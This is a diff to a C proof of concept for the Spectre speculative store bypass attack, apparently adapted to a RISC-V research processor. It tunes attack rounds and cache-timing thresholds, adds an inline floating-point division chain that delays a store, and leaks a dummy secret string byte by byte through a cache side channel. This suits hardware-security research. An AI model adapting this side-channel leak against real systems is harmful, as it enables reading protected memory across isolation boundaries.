@@ -2,8 +2,8 @@
 
 // No printf in RSD so all unnecessary printfs have been commented out.
 
-//#include <stdio.h>
-//#include <stdint.h>
+#include <stdio.h>
+#include <stdint.h>
 //#include <string.h> // For strlen()
 //#include <stdlib.h> // For rand() and srand()
 //#include <time.h> // For time(NULL)
@@ -24,16 +24,17 @@
  */
 //#define TRAIN_TIMES 24 // (Spectre-SSB does not need trainning.) Times to train the predictor. There shall be an ideal value for each machine.
 // Note: smaller TRAIN_TIMES values increase misses or even cause failure, while larger ones unnecessarily take longer time.
-#define ATTACK_ROUNDS 5 // 40 Times to attack the same index. Ideal to have larger ATTACK_ROUNDS (takes more time but statistically better).
+#define ATTACK_ROUNDS 3 // used to be 8, 20, originally 40 Times to attack the same index. Ideal to have larger ATTACK_ROUNDS (takes more time but statistically better).
 // For most processors with simple MDP(Memory Dependence Prediction), theoretically 1 will be enough for a successful Spectre-SSB attack.
-#define CACHE_HIT_THRESHOLD 43 // Even 1000 seems to be not enough. Interval smaller than CACHE_HIT_THRESHOLD will be deemed as "cache hit". Ideal to have lower CACHE_HIT_THRESHOLD (higher accuracy).
+#define CACHE_HIT_THRESHOLD 33 // 37-43 will see changes. Interval smaller than CACHE_HIT_THRESHOLD will be deemed as "cache hit". Ideal to have lower CACHE_HIT_THRESHOLD (higher accuracy).
 // To keep results accurate, the larger TRAIN_TIMES and ATTACK_ROUNDS you have, the smaller CACHE_HIT_THRESHOLD shoud be.
 
 /* <<<<<< Mostly used parameters for debugging are listed above. <<<<<< */
 
 
 //#define DEFAULT_STRING "#Secret_Information!"
-#define DEFAULT_STRING "#Secret!"
+//#define DEFAULT_STRING "#Secret!"
+#define DEFAULT_STRING "q534502"
 #define MAX_STRING_LENGTH_FACTOR 8
 /**
  * Arbitrary as long as your machine allows it
@@ -86,32 +87,56 @@
  * For simplicity it is to set equal to RESULT_ARRAY_SIZE and has been proved to be sufficient. 
  */
 
-char* guideArray[ARRAY_SIZE_FACTOR];
+uint8_t guideArray[ARRAY_SIZE_FACTOR];
+//char* guideArray[ARRAY_SIZE_FACTOR];
 // Data type follows "delayer" and "memoryDestination".
 // TBD: optimize its array size to fit the later input "secretString".
 uint8_t probeArray[ARRAY_SIZE_FACTOR * ARRAY_STRIDE];
 
 /* Declare a global variable that prevents the compiler from optimizing out victimFunc() . */
 uint8_t anchorVar = 0;
+uint8_t shift_base = 2;
 
-char** delayer[ARRAY_SIZE_FACTOR];
+uint32_t tempStringIndex = 1;
+uint32_t tempString[ARRAY_SIZE_FACTOR];
+
+//char** delayer[ARRAY_SIZE_FACTOR];
 // Its size shall be set to that of the guideArray.
-char knownString[ARRAY_SIZE_FACTOR];
+//char knownString[ARRAY_SIZE_FACTOR];
 // TBD: investigate relations between its values and guessed results. 
 
 /**
  * @input idx input to be used to idx the array
  */
-void victimFunc(uint32_t idx){
+//void victimFunc(uint32_t targetAddr, uint32_t idx){
+void victimFunc(uint32_t targetAddr){
 
 	// "Slowly" store a value at a memory location (here *memoryDestination).
-	char **memoryDestination = *delayer;
+//	char **memoryDestination = *delayer;
 	// "Quickly" load that value from that memory location.
-	*memoryDestination = knownString;
-	
-	// Will only succeed on machines with MDP (Memory Dependence Prediction) mechanism.
-	anchorVar &= probeArray[(*guideArray)[idx] * ARRAY_STRIDE];
+//	*memoryDestination = knownString;
+//	tempStringIndex = idx; 
+	tempString[1] = targetAddr;//tempString[idx]=
+	tempStringIndex = tempStringIndex << 4;
+	asm("fcvt.s.wu	fa4, %[in]\n"
+		"fcvt.s.wu	fa5, %[inout]\n"
+		"fdiv.s	fa5, fa5, fa4\n"
+		"fdiv.s	fa5, fa5, fa4\n"
+		"fdiv.s	fa5, fa5, fa4\n"
+		"fdiv.s	fa5, fa5, fa4\n"
+//		"fdiv.s	fa5, fa5, fa4\n"
+//		"fdiv.s	fa5, fa5, fa4\n"
+//		"fdiv.s	fa5, fa5, fa4\n"
+//		"fdiv.s	fa5, fa5, fa4\n"
+		"fcvt.wu.s	%[out], fa5, rtz\n"
+		: [out] "=r" (tempStringIndex)
+		: [inout] "r" (tempStringIndex), [in] "r" (shift_base)
+		: "fa4", "fa5");
 
+	tempString[tempStringIndex] = 0;
+	// Will only succeed on machines with MDP (Memory Dependence Prediction) mechanism.
+//	anchorVar &= probeArray[(*guideArray)[idx] * ARRAY_STRIDE];
+	anchorVar &= probeArray[guideArray[tempString[1]] * ARRAY_STRIDE];//tempString[idx]
 }
 
 // TBD: mix the order in other ways.
@@ -129,7 +154,7 @@ int main(void){
 	// Fixed because there is no printf in RSD.
 	char* secretString = DEFAULT_STRING;
 	// Can not use strlen(secretString) so use this instead
-	uint32_t secretStringLength = 12; // 32. Save time.
+	uint32_t secretStringLength = 8; // Used to be 12, 32. Save time.
 
     	// Allocate memory for the string. 
 	// Need to do this in main function because return 1 of subfunction will not terminate the main.
@@ -140,7 +165,8 @@ int main(void){
 	//}
 	
 	//dynamicInputString(defaultString, maxStringLength, secretString);
-	
+
+	uint32_t attackIdx = (uint32_t)(secretString - (char*)guideArray);
 	uint32_t mixed_i;
 	register uint32_t start, diff;
 	uint32_t dummy;
@@ -153,18 +179,22 @@ int main(void){
 	uint32_t hitArray[2];
 	
 	//char guessString[strlen(secretString)+1];
-	char guessString[secretStringLength+1];
-	/* Fill the guessString with NULL terminators. */
-	for (int i = 0; i < sizeof(guessString); i++){
-		guessString[i] = '\0';
-	}
+//	char guessString[secretStringLength+1];
+//	/* Fill the guessString with NULL terminators. */
+//	for (int i = 0; i < sizeof(guessString); i++){
+//		guessString[i] = '\0';
+//	}
 
 	/* Fill the knownString with NULL terminators. */
-	for (int i = 0; i < ARRAY_SIZE_FACTOR; i++){
-		knownString[i] = '\0';
-	}
+//	for (int i = 0; i < ARRAY_SIZE_FACTOR; i++){
+//		knownString[i] = '\0';
+//	}
 
 	//srand(time(NULL));
+
+        for (int i = 0; i < sizeof(guideArray); i++){
+                guideArray[i] = 1;
+        }
 
 	/* Write to probeArray so in RAM not copy-on-write zero pages. */
 	for (int i = 0; i < sizeof(probeArray); i++){
@@ -204,28 +234,28 @@ int main(void){
 		// Run the attack on the same idx for ATTACK_ROUNDS times.
 		for(uint32_t atkRound = 0; atkRound < ATTACK_ROUNDS; atkRound++){
 			
-			*delayer = guideArray;
-			*guideArray = secretString;
+//			*delayer = guideArray;
+//			*guideArray = secretString;
 			
 			// Make sure array you read from is not in the cache.
-			flushCache((uint32_t)delayer, sizeof(delayer));
+//			flushCache((uint32_t)delayer, sizeof(delayer));
+//			flushCache(tempStringIndex, sizeof(tempStringIndex));
 			flushCache((uint32_t)probeArray, sizeof(probeArray));
-
-			/* Delay (act as mfence, memory fence) */
-			// Set of constant takens to make the BHR be in a all taken state				
-			for(volatile int k = 0; k < ARRAY_SIZE_FACTOR; k++){
-				asm("");
-			}
 			
-			victimFunc(len); 
+//			victimFunc(len);
+			victimFunc(attackIdx);
+//			victimFunc(attackIdx,len);
 	
 			// Read out probeArray and see the hit secret value.		
 			/* Time reads. Order is slightly mixed up to prevent stride prediction (prefetching). */
 			for (int i = 0; i < ARRAY_SIZE_FACTOR; i++) {
 				mixed_i = ((i * MIXER_A) + MIXER_B) & (ARRAY_SIZE_FACTOR-1);
-				start = READ_CSR(cycle);
+//                                mixed_i = i;
+				start = READ_CSR(mcycle);
+				//There should be nothing between these 2 rows, otherwise you need to adjust the threshold. 
 				dummy &= probeArray[mixed_i * ARRAY_STRIDE];
-				diff = (READ_CSR(cycle) - start);
+				diff = (READ_CSR(mcycle) - start);
+
 			
 				// Condition: interval of time is smaller than the threshold, AND the character is not a legal addreess value predefined.			
 //				if ((uint32_t)diff < CACHE_HIT_THRESHOLD && mixed_i != knownString[len]){
@@ -241,14 +271,29 @@ int main(void){
 		results[0] ^= dummy;
 		topTwoIdx(results, RESULT_ARRAY_SIZE, output, hitArray);
 
-        // No printf in RSD
-		//printf("MA[%p] ~ SO(%lu) ~ TC("ANSI_CODE_YELLOW"%c"ANSI_CODE_RESET") <-?-- GR("ANSI_CODE_CYAN"%c"ANSI_CODE_RESET", %d, %lu)\n", (uint8_t*)(secretString+len), len, secretString[len], output[0], output[0], hitArray[0]);
+//	char x = (char)output[0]+'0';
 
-        *outputAddr = output[0];
+	*outputAddr = 'V';
+        *outputAddr = 'a';
+        *outputAddr = 'l';
+        *outputAddr = 'u';
+        *outputAddr = 'e';
+        *outputAddr = ':';
+        *outputAddr = ' ';
+        *outputAddr = (char)output[0];// + '0';//
+//	*outputAddr = x;//output[0];
+        *outputAddr = ' ';
+        *outputAddr = 'H';
+        *outputAddr = 'i';
+        *outputAddr = 't';
+        *outputAddr = ':';
+        *outputAddr = ' ';
+        *outputAddr = (char)hitArray[0] + '0';
         *outputAddr = '\n';
 
-		guessString[len]=(char)output[0];
-		
+//		guessString[len]=(char)output[0];
+	attackIdx++;
+//	tempStringIndex++;
 	}
 
     *outputAddr = '=';
